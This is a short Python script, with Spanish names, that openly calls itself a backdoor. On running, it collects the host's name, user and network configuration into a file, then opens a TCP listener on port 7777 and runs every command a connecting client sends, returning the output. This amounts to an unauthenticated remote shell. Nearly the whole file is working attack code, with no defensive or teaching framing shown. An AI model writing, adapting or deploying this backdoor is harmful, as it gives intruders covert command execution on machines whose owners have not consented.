import socket
import subprocess
import pickle
import os
import time
import argparse

parse = argparse.ArgumentParser()
parse.add_argument("-d", "--direccion", help="direccion")
args = parse.parse_args()

global datos
global file

HOSTER=args.direccion
PUERTO=7777;

datos={}
file = "info.dat"

class Installer:
    def intall_backdoor():

        main = ["hostname", "whoami", "ifconfig", "ip addr", "ip link"]
        hostname = subprocess.check_output(main[0], shell=True, text=True);
        whoami = subprocess.check_output(main[1], shell=True, text=True);
        ifconfig = subprocess.check_output(main[2], shell=True, text=True);
        ipaddr = subprocess.check_output(main[3], shell=True, text=True);
        datos["hostname"] = hostname
        datos["whoami"] = whoami
        datos["ifconfig"] = ifconfig
        datos["ipaddr"] = ipaddr
        with open(file, "wb") as file_:
            pickle.dump(datos, file_)
        print("datos guardados correctamente")



LOGGER = "registro.dat"
DATOS_MANAGER={}

Installer.intall_backdoor()
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sock.bind((HOSTER, PUERTO))
sock.listen(1)

print("Esperando conexiones entrantes")

while True:
    conexion, direccion = sock.accept();
    DATOS_MANAGER["conexion"] = direccion
    with open(LOGGER, "wb") as session:
        pickle.dump(DATOS_MANAGER, session);
    while True:
        conexion.sendall(b'\n!>>> ')
        comando = conexion.recv(10224).decode('utf-8');
        if not comando:
            break
        salida = subprocess.getoutput(comando)
        conexion.sendall(salida.encode('utf-8'))
    conexion.close()